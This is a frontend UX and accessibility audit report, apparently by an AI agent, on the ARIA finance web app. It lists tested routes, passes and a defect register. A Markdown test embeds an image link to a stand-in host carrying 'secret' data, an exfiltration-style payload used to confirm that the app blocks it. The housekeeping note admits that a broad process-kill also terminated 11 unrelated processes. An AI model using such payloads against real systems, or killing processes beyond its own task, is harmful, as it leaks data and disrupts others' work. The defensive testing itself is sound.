# ARIA Product and Frontend Audit (Phase A, 2 Nov 2026)

Scope: the single UI at `web/src/versions/v2` (Vitara Markets look, Light/Night/Auto), run on the working tree at `63b26ad` plus uncommitted edits. Backend, security, QA and performance are covered in the other reports and not repeated here. This file supersedes the route/component tables in the older `PRODUCT_INVENTORY.md` (which described v1/v2 and four themes that no longer exist).

## How it was tested
* Isolated stack: `scripts/audit_server.py` on port 8017 (run id `fe-audit`, scratch DB under `.audit/`, `ARIA_AUTH_MODE=private`) and Vite on 5177. Offline: every non-127.0.0.1 request is aborted and recorded; markets/instruments/news are the synthetic fixtures. No LLM call, no GPU server, no real microphone (`SpeechRecognition`, `webkitSpeechRecognition` set to undefined and `getUserMedia` rejected in every page). One Chromium at a time, closed after each script.
* Scripts (plain Playwright via `web/node_modules`, no edits to `web/e2e` or `web/src`): `ARIA_EVALUATION/tests/frontend/probe_matrix.mjs`, `probe_meeting.mjs`, `probe_chat.mjs`, `probe_pages.mjs`, `probe_a11y.mjs`, `probe_misc.mjs`, `probe_final.mjs`, `probe_night.mjs`, helper `common.mjs`. Raw results: `ARIA_EVALUATION/evaluation/frontend_*.json`. Screenshots: 37 files in `ARIA_EVALUATION/tests/frontend/shots/`.
* Live-meeting controls need the avatar iframe to report "connected/started". Offline the avatar page cannot load its CDN modules, so for the meeting-interaction tests the iframe URL `/avatar/live` was replaced by a small stub page that posts the same `aria-live` messages. Meeting behaviour that depends on the real avatar, speech or lip-sync is therefore UNTESTED.
* Housekeeping note: when stopping my servers I used a process-name pattern (`audit_server.py` / `--port 5177`) that also terminated other matching Python/Node processes (11 PIDs). If another agent's audit server on 8765 died around the end of this run, that was me.

## Summary
The UI is in good shape structurally: no horizontal page scroll at any of the six widths on any of the ten routes; all nine top-bar destinations fit at 1920/1440/1280/1100/768/390; no unnamed buttons or unlabelled form fields on any route; one `h1` per page; visible focus rings on almost every stop; reduced motion is honoured; no text-contrast failure on any enabled control in Light or Night; generic, non-leaking error messages for network, 500 and 429 failures; Markdown renders without images or raw HTML. The defects are concentrated in the live meeting on narrow screens, the skip link, the navigation ARIA pattern, and a few polish items.

Headline defects (details in the register):
1. UX-01 (P1) Live meeting header is about 760 px wide: below that the Chats and Leave buttons are off-screen and the whole meeting scrolls sideways, so on a phone the chat panel is cut off.
2. UX-02 (P2) The "Skip to main content" link rewrites the URL hash to `#main`, which the router reads as an unknown route and jumps to Markets.
3. UX-03 (P2) The nine destinations are `role=tab` without tabpanels, `aria-controls` or arrow-key support (tabindex 0 on every tab): wrong ARIA pattern for page navigation.
4. UX-04 (P2) Chat "Clear" deletes the conversation with no confirmation and no undo; Delete-all-finance-data does confirm.
5. UX-05 (P2) The avatar iframe depends on `cdn.jsdelivr.net` (MediaPipe and TalkingHead modules); when unreachable the user sees a raw `TypeError: Failed to fetch dynamically imported module: https://cdn...` in the meeting.
6. Smaller: every route has `document.title` "ARIA"; instrument key facts show raw key labels ("Return 1m pct", "Cagr since start pct"); the Settings "Appearance" heading has nothing under it; continue-as dialog does not take focus.

## 1. Inventory (VERIFIED from `web/src/versions/v2/App.tsx`, `Sidebar.tsx`, run in the browser)
Entry `main.tsx` -> `AuthGate` -> `VersionRouter` (lazy-loads only `versions/v2/App`). Hash routes, unknown hash falls back to Markets (URL left as typed, UX-12):

| Route | Page | Notes observed |
|---|---|---|
| `#/markets` (default) | Markets dashboard | ticker tape, status chips, group pills, index cards, insight, heatmap, movers, watchlist, news with search/filters/pagination, "Your money" panel |
| `#/explore` | Explore | instrument search (9 type chips, combobox/listbox), watchlist, instrument drawer (quote, chart + ranges, key facts, SIP simulator, ask panel, disclaimer line) |
| `#/chat` | Chat | defaults to the full-screen Live meeting; modes Normal / Conversational / Live Avatar (Free) in a Mode select; `Chats` history button |
| `#/research` | Reports | create form, saved reports, viewer |
| `#/intelligence` | Intelligence | analyse form with example chips, result, sentiment scorer |
| `#/profile` | Profile | quick-form wizard (5 steps), transactions, statement upload, spending insights, delete-all |
| `#/progress` | Progress | empty banner + "Ask ARIA to explain a concept" |
| `#/feedback` | Feedback | name, email, category, how-heard (+Other), message; status endpoint |
| `#/settings` | Settings | Colour mode (Light/Night/Auto), Account (accounts mode only), About |
| `#/disclaimers` | Disclaimers | not in navigation; linked from strip, Settings, drawers |

Global: disclaimer strip (fixed, long/short copy), skip link, top bar (brand, global search, New chat, Light/Night toggle, tabs; Chats button on Chat), ticker tape with Pause, instrument drawer, history panel (portal, left, resizable, `aria-hidden`+`inert` when closed), live meeting (portal, `role=dialog aria-modal`). History panel controls observed: search, Pin, Rename, Archive, Delete, Archived chats, "How do you want to continue?" dialog (Chat / Voice / Video call). Message actions observed: Copy answer, Regenerate answer, follow-up suggestion chips; rating buttons appear only once the saved turn has an id (not observed in this run because the synthetic server turn path did not return one, UNTESTED). Live meeting: header (brand, connection + timer, Avatar select "ARIA Avatar"/"New ARIA Avatar", Chats, Leave), stage iframe, status pill, toolbar (Mic, Speak/Interrupt, Captions, Chat, End), resizable conversation panel, leave-confirm alertdialog.
Auth screens (accounts mode): UNTESTED (private mode run; `web/playwright.accounts.config.ts` exists).
Dead code (VERIFIED by file listing): `web/src/App.tsx`, `web/src/components/**` still holds a full second copy of most tabs plus `NewsFeed.tsx.bak`; v2 imports the live meeting, feedback tab and brand from the root `components/` folder. Only the imports from `versions/v2` ship, so edits to the root copies of tabs have no effect (maintenance risk, UX-14).

## 2. What passed (VERIFIED, `frontend_matrix.json`, `frontend_a11y.json`)
* Horizontal overflow: `scrollWidth <= innerWidth` for all 10 routes x 6 widths (60 combinations) outside the meeting; tab bar `scrollWidth <= clientWidth` at every width; no tab outside the viewport. At 390 the tab bar wraps to two rows inside a rounded container (screenshot `m-390-markets.png`).
* Names and labels: 0 unnamed buttons/links and 0 unlabelled inputs/selects/textareas on every route at every width (visible elements only). 0 images without `alt`.
* Headings: one `h1` per page ("ARIA chat" is a screen-reader-only h1 in Chat).
* Contrast (enabled controls, solid backgrounds, WCAG AA 4.5/3): 0 failures in Light and Night on all routes. The 6 hits (primary buttons "Analyse", "Generate research report", paginator "Prev", wizard "Back") are disabled buttons at 50% opacity, which WCAG exempts. Elements on gradients/images were skipped (UNTESTED).
* Reduced motion: with `prefers-reduced-motion: reduce` zero animations run; without it only the ticker `tape-scroll` runs (2 infinite animations); a Pause button exists for the tape.
* Focus rings: 0 stops without a ring on Markets, Profile, Disclaimers; the only ring-less stops found are listed in UX-10.
* Meeting a11y: `role=dialog aria-modal`, siblings made `inert`, focus returns to the previous element, closed conversation panel is `inert`, opening it focuses the textarea, Escape closes the panel and the continue dialog, leave-confirm focuses "Stay in meeting", `Leave this meeting?` shows when a draft or an answer in progress exists, history panel (z-index 10001) opens above the meeting, avatar switch asks `window.confirm("Switching the avatar restarts the meeting. Continue?")` and dismissing keeps the old choice, divider drags (400 -> 523 px, saved to `aria_meeting_chat_width`) and has `role=separator tabindex=0`, ArrowLeft widens it (523 -> 547).
* Chat states: empty (hero + onboarding + template cards); Send disabled when empty; busy (user bubble shown at once, "Reading your question", Stop button, input disabled); error for aborted request, HTTP 500 (with a traceback-looking `detail`) and HTTP 429 all show the same calm message "ARIA couldn't put an answer together just now. Please try again in a moment." plus a Try again button; the raw detail is not shown.
* Markdown (crafted reply): headings, bold, GFM table, lists render; `![..](https://evil.example/x.png?q=secret)` becomes an empty paragraph (no `<img>` from Markdown, no request to the external host: `external` list only contains the avatar CDN); `<script>` is shown as text; indian grouping (`₹1,26,825`, `₹23.2 lakh`) shown as written; a 300-character unbroken word and a 4-column table do not cause page scroll at 390.
* Feedback: native required/email/minlength validation (message < 10 characters shows the browser message); with the POST mocked, a failure shows an inline `role=alert` message ("SMTP down" shown verbatim from `detail`) and keeps the typed text; success shows a `role=status` thank-you and "Send another response". (No real submission: status endpoint reports `configured: true`, so the POST was mocked to avoid any email.)
* Profile: Age field range 18-100, invalid value blocks "Save & next" with "Please fix the highlighted field first, or clear it to skip." and an inline range hint; sample transactions load and spending insights appear; Delete-all asks `window.confirm("Delete all your finance data (profile and transactions)? This cannot be undone.")`.
* Explore: no-match state ("No match for ... Check the spelling, try the ticker or the fund house name, or choose All."), results, drawer opens on a result and closes on Escape.
* History: empty state ("No chats yet. Anything you ask in chat, voice or the live meeting is saved here."), no-match search state, panel pushes the page (main starts at x=300), 320 px wide at 390 viewport without page scroll.
* Settings Night mode applies (`data-mode=night`) and persists across reload (`aria_mode`).
* Console on the ten routes (outside Chat's meeting): 0 errors/warnings; 0 failed requests; 0 HTTP >= 400.

## 3. Defect register
Severity P0 (blocker) - P3 (polish). All labelled VERIFIED unless stated.

### UX-01 (P1) Live meeting header overflows below ~760 px; Chats and Leave unreachable, meeting scrolls sideways
* Component: `web/src/components/chat/LiveMeeting.tsx` header + `LiveMeeting.css` (`.meeting-header`, `@media(max-width:520px)` only trims padding and hides small text).
* Evidence: `probe_meeting.mjs`/`probe_final.mjs`, `frontend_meeting.json`, `frontend_final.json`. Right edge of `.meeting-exit` is 760 px at widths 600, 560 (and 548 px at 520/480/430/414/390); `.live-meeting` `scrollWidth` is 984 at 600, 1030 at 520, 818 at 414. At 768 the header fits (exit right = 760). At 390 the Chats and X buttons are at x=432-548 (outside a 390 px screen). With the conversation open at 390, focus on the textarea scrolls the meeting sideways: chat panel x=-148..222, controls x=-109..183 (`shots/b-meeting-chat-390.png`: header and chat both cut off).
* Why it matters: the meeting is the DEFAULT view of Chat; on any phone the user cannot open history or use the X; the open conversation panel is half off-screen. Leave remains possible only via the End button in the footer.
* Fix: let the header wrap/shrink on small screens (hide the "Avatar" label text and brand tagline, `min-width:0` on the flex children, move Avatar select into a menu), set `overflow:hidden` on `.live-meeting`.
* Regression risk: low-medium (CSS only; re-run `web/e2e/live-meeting.spec.ts`, `nav-fit.spec.ts`).

### UX-02 (P2) Skip link navigates to Markets
* Component: `versions/v2/App.tsx` (`<a className="skip-link" href="#main">`) + `tabFromHash`.
* Steps: open `#/settings`, focus the skip link, press Enter. Result: URL `#main`, page shows "Markets" (`probe_final.mjs`: `skipOnSettings {hash:"#main", h1:["Markets"]}`; `probe_misc.mjs` first run saw the same). Focus does land on `main`, but the route is lost. Same for keyboard users on every page.
* Why: the first control a keyboard/screen-reader user meets throws them off their page. Also the skip link is the second tab stop (the disclaimer link in the strip is first).
* Fix: `onClick` -> `preventDefault(); document.getElementById('main')?.focus()`; place the skip link before the strip in the DOM.
* Regression risk: low.

### UX-03 (P2) Navigation uses the tab pattern incompletely
* Component: `versions/v2/components/Sidebar.tsx` (`role=tablist` on `<nav>` children, `role=tab`).
* Evidence: `frontend_a11y.json` `misc.navRole`: 9 tabs all `tabindex=0`, 0 `tabpanel`, no `aria-controls`; ArrowRight from "Settings" leaves focus on "Settings" (no arrow-key handling; no wrap). The items are `<button>`, not links, so "open in new tab", middle-click and link announcements do not work. `<nav>` landmark is not exposed (tablist sits in `<aside>`).
* Why: screen-reader users are told "tab" and expect panels and arrow keys; the current-page state is already conveyed by `aria-current`.
* Fix: render a `<nav aria-label="Main">` with `<a href="#/route" aria-current="page">`; drop `role=tablist/tab`.
* Regression risk: medium (e2e specs select `getByRole('tab', ...)`; they must be updated; `nav-fit.spec.ts` uses tab role).

### UX-04 (P2) "Clear" chat is instant and irreversible
* Component: `ChatTab.tsx` `clearChat` (no confirm); `Clear` button sits next to the Mode select.
* Evidence: `probe_chat.mjs` `clear: {nativeConfirm:false, hero:1}` - click returns to the empty hero with no dialog. Contrast: Delete-all finance data and avatar switch both confirm.
* Why: one mis-click deletes a conversation (server-side `api.clearChat`). Also the same word "Clear" next to a mode select is easy to hit.
* Fix: confirm dialog or an "Undo" toast; or rename to "Clear this chat".
* Regression risk: low (update `web/e2e` tests that click Clear).

### UX-05 (P2) Avatar depends on a public CDN and shows a raw error when it is missing
* Component: `interface/avatar/live.html` (served at `/avatar/live`) imports `cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.14/vision_bundle.mjs` and `cdn.jsdelivr.net/gh/met4citizen/TalkingHead@1a7ca9c8a9/modules/talkinghead.mjs`; it also polls `http://127.0.0.1:8010/health` (talking-photo server) which yields a console `ERR_CONNECTION_REFUSED` when absent.
* Evidence: `frontend_matrix.json` `external` lists exactly those two URLs; `shots/m-1440-chat.png` shows the meeting stuck on "Loading..." with "Connection lost", "Avatar failed to load. Leave and try again." and the visible text `TypeError: Failed to fetch dynamically imported module: https://cdn.jsdelivr.net/gh/met4citizen/TalkingHead@1a7ca9c8a9/modules/talkinghead.mjs` (clipped at 390 px).
* Why: the default Chat view depends on a third-party host at runtime (privacy: IP disclosure to jsDelivr; availability; corporate/offline networks), and the failure copy is developer text. The Start button stays disabled ("Loading...") so there is no usable fallback to chat inside the meeting (the text box says "Start the meeting to chat").
* Fix: self-host the two modules (vendor into `web/public` or `interface/avatar/static`), and map load errors to "The avatar could not load. Switch to Normal Mode to keep chatting." with a button that sets Normal Mode.
* Regression risk: medium (bundle size, licence notices for TalkingHead and MediaPipe).

### UX-06 (P3) Same page title on every route
* Evidence: `misc.titles` - `document.title` is "ARIA" on all ten routes. Browser history, tab list and screen readers cannot tell pages apart; route changes are not announced (focus stays on the nav button).
* Fix: set `document.title = "<Page> - ARIA"` in `useTab`, optionally move focus to the `h1`.
* Regression risk: very low.

### UX-07 (P3) Instrument "key facts" show raw field names
* Component: `versions/v2/components/explore/InstrumentDrawer.tsx:45` `human()` converts snake_case to sentence case.
* Evidence: drawer shows "Return since start pct", "Cagr since start pct", "Return 1m pct", "Return 3m pct", ... "Return 3y pct" (values 112.57, 14.02, -3.32 without % signs) (`frontend_misc.json` `drawerKeyFacts`). The curated list at line 37 uses proper labels; the fallback leaks for the computed stats. Also "Market risk" / "Tracking error" tags have no explanation (SUSPECTED from one fixture instrument) and the fixture description "A company." is shown for an ETF (fixture artefact, not counted).
* Why financial clarity: percentages without a unit or a time basis ("CAGR since start" of what start date, shown separately as "First date") are easy to misread.
* Fix: add the missing keys to the curated list with labels "1-month return (%)", "CAGR since first date (%)" and the `pct` formatter.
* Regression risk: low.

### UX-08 (P3) Settings: empty "Appearance" heading
* Component: `versions/v2/components/settings/SettingsTab.tsx` renders `<h2>Appearance</h2>` directly followed by `<h2>Colour mode</h2>`; the former theme radios were removed. Screen readers announce an empty section. Also the page no longer offers the "adapt tone / forget how I talk" controls that the older inventory listed (absent now; confirm this is intended - RECOMMENDATION).
* Fix: delete the heading or nest Colour mode under it.

### UX-09 (P3) Continue-as dialog does not take focus
* Component: `HistoryPanel.tsx` (`role=dialog aria-modal`, no focus move or trap).
* Evidence: after clicking a chat in the panel the dialog opens but `document.activeElement` is still the chat row ("What is a mutual fund"); keyboard users can tab behind the backdrop. Escape closes it (works).
* Fix: focus the first option on open, trap Tab, restore focus on close.

### UX-10 (P3) A text-only focus stop without a ring, and drawer without focus trap
* Evidence: in the 22-stop tab walk, Research/Intelligence/Profile/Progress/Feedback/Settings/Explore each contained one stop with no visible ring: on Progress and Research it is a stop labelled "ARIA is an AI research and e..." right before "Read the full disclaimers" (the fixed strip: it is not `tabindex`ed and not scrollable per computed style, so the cause is SUSPECTED, not verified), and the Explore search input shows no ring (`INPUT|NORING`; may be an input border style).  The instrument drawer (`aria-modal` dialog) lets focus leave after ~40 Tab presses (`drawerFocusTrap:false`), and focus on open lands on the container `DIV`.
* Fix: audit `:focus-visible` on `.input`, give the drawer focus management like the meeting.

### UX-11 (P3) Small touch targets on phones
* Evidence: at 390 px the nine destinations are 32 px high, search and Light/Night toggle 40x40, "Read the full disclaimers" 17 px high, New chat 38 px. WCAG 2.2 minimum is 24 px (met); platform guidance is 44 px (not met). No target under 24 px found by `probe_matrix.mjs` except 1-2 items per page (not itemised; the matrix `small` counts <24 px: 1-2 on most pages, 10-20 at 1100 px where the tab pills shrink - SUSPECTED the 1100 px count is the ticker/market pills, not itemised).
* Fix: raise `min-height` for pills and tabs on coarse pointers.

### UX-12 (P3) Unknown route keeps the bad URL
* Evidence: `#/nonsense` renders Markets but the URL stays `#/nonsense`; no 404 message. Fix: `history.replaceState` to the default route.

### UX-13 (P3) Same generic error for rate limiting and server faults
* Evidence: HTTP 429 shows "couldn't put an answer together ... try again in a moment" (same as 500/abort). Good for not leaking details, but a user who is rate-limited gets no hint to wait longer. RECOMMENDATION: map 429 to "You are sending messages quickly; wait a moment".

### UX-14 (P3, maintenance) Large unreachable duplicate source tree
* `web/src/components/**` (~75 files) and `web/src/App.tsx` are copies of the v2 pages and are not shipped except where v2 imports them; `NewsFeed.tsx.bak`. Edits to the wrong copy are silently lost. RECOMMENDATION: delete or make `versions/v2` the only tree.

## 4. Financial information clarity (VERIFIED where stated)
* Disclaimer strip on every page ("not a SEBI-registered adviser ... Markets are risky", short copy on phones); `DisclaimerLine` repeated in drawers.
* Markets: provenance text states source, "Data delayed ~15 min", "Stale, last updated 1 Oct, 15:30 IST" chip in red, "Exchange holidays not tracked", "Quotes may be delayed or cached". Raw ISO timestamps are printed in the provenance paragraph ("Data as of: 2026-10-01T10:00:00+00:00") - readable only by experts (P3, fixture-independent as it is a format string; SUSPECTED location `components/markets/Provenance.tsx`).
* Drawer: price with currency, change arrows plus sign (not colour alone), "Data · Yahoo Finance · 12 Oct, 00:00 IST", delay and "Stale: showing the last value ARIA could fetch" notes, chart "View data as table" alternative.
* Chat replies keep numbers as the engine wrote them (Indian digit grouping in the crafted test); the trust grounding tag was not displayed in the crafted reply because the crafted payload omitted it (UNTESTED whether the UI shows the "numbers checked / not checked" tag from real responses).
* Intelligence page: score "67/100 Mixed overall", factor weights and "not a recommendation" wording shown.
* Feedback and Profile warn about sensitive data ("leave out passwords and sensitive financial details").

## 5. Consistency across pages (VERIFIED visually: `m-*`, `e-*` shots)
Same top bar, strip, ticker and card/pill styling on every page; Light and Night both applied. Differences: the Chat page (meeting) is a different dark theme regardless of Light/Auto mode (by design, `--meet-*` tokens, always dark); form controls differ (Feedback uses its own `fb-*` styles, Profile uses `.input`/`.btn`) but look consistent at the screenshots reviewed. Disabled primary buttons depend on 50% opacity and give no reason (Intelligence "Analyse" and Reports "Generate research report" are disabled until a company is chosen with no hint text) - RECOMMENDATION: show helper text ("Choose a company to continue").

## 6. Not tested (and why)
* Real avatar behaviour: loading, speech, lip-sync, New ARIA Avatar video presenter, avatar switch restarting the call, captions, mic (BLOCKED by constraints: no microphone, no GPU server, CDN blocked/offline). Only the shell around it was exercised with a stub iframe.
* Real LLM answers, streaming, quizzes, research report generation and viewer, PDF/HTML downloads, statement upload (CSV/XLSX/PDF), report forecast validation, Markets news modal/Q&A, sector heatmap, movers with data (fixture returns empty movers/sectors), chart interactions - UNTESTED (offline fixtures are thin).
* Accounts mode (sign in, create account, Google button, Account section in Settings): UNTESTED.
* Message rating/Pin/Rename/Archive/Delete/export actions in the history panel were enumerated (buttons exist) but not executed; second saved chat did not appear in the list in my run (SUSPECTED test sequencing, not investigated).
* Screen reader announcements (NVDA/VoiceOver), real touch devices, 200% zoom and text-spacing, forced-colours mode, Safari/Firefox: UNTESTED (Chromium only).
* Contrast on gradient/image backgrounds and in the meeting dark theme: UNTESTED (the checker skips elements over images).
* Performance/load times: covered by the performance audit, not repeated.
